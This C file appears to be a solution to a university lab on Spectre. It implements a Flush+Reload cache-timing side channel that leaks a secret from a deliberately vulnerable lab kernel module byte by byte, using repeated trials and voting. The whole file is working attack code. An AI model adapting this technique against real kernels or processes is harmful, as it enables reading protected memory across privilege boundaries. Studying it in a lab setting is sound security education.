/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define CACHE_THRESHOLD 225
#define PAGE_SIZE 4096
#define NUM_SLOTS 256
#define TRIALS 100

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}


static void flush_probe_array(char *shared_memory) {
    //Flushes all 256 page-spaced slots from cache	
    for (int i = 0; i < NUM_SLOTS; i++) {
        clflush(&shared_memory[i * PAGE_SIZE]);
    }
    __asm__ volatile("mfence" ::: "memory");
}


static int reload_and_find_hit(char *shared_memory) {
    int best_index = -1;
    uint64_t best_time = (uint64_t)-1;
    
    //Check all slots and see which requires the longest time access 
    for (int i = 0; i < NUM_SLOTS; i++) {
        int idx = (i * 167 + 13) & 0xFF;   
        volatile char *slot = (volatile char *)&shared_memory[idx * PAGE_SIZE];
 
        uint64_t t = time_access((void *)slot);
 
        if (t < CACHE_THRESHOLD && t < best_time) {
            best_time  = t;
            best_index = idx;
        }
    }
 
    return best_index;
}


static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
   int votes[NUM_SLOTS] = {0};
    
    //Run many trials to reduce noise
    for (int t = 0; t < TRIALS; t++) {
        flush_probe_array(shared_memory);

        call_kernel_part1(kernel_fd, shared_memory, offset);

        int hit = reload_and_find_hit(shared_memory);
        if (hit >= 0) {
            votes[hit]++;
        }
    }

    //Return slot index with the highest number of nominations
    int best_val = 0;
    for (int i = 1; i < NUM_SLOTS; i++) {
        if (votes[i] > votes[best_val]) {
            best_val = i;
        }
    }
    return (unsigned char)best_val;
}


/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
	unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, current_offset);
 
        printf("offset %zu -> 0x%02x ('%c')\n", current_offset, leaked_byte, (leaked_byte >= 0x20 && leaked_byte < 0x7f) ? leaked_byte : '?');

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
